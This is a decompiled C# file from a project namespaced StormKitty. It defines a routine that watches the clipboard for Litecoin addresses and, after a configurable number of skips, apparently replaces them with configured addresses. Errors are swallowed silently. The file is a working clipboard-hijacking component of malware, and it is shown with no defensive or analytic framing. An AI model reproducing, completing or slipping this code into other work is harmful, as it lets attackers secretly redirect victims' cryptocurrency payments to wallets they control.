using System;
using System.Linq;
using System.Windows.Forms;

namespace StormKitty
{
	// Token: 0x02000046 RID: 70
	internal class LiteCoin
	{
		// Token: 0x06000126 RID: 294 RVA: 0x000098F4 File Offset: 0x00007AF4
		public static void GetLiteCoinWhile()
		{
			try
			{
				if (Clipboard.ContainsText())
				{
					string text = Clipboard.GetText();
					if (!Config.walletsltc.Contains(text) && CheckLTC.Clipregex(text))
					{
						if (LiteCoin._oppToMiss > 0)
						{
							LiteCoin._oppToMiss--;
						}
						else
						{
							LiteCoin._oppToMiss = Config.OppToMissDef;
							CheckLTC.SetsLTC(text);
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000086 RID: 134
		public static int _oppToMiss;
	}
}
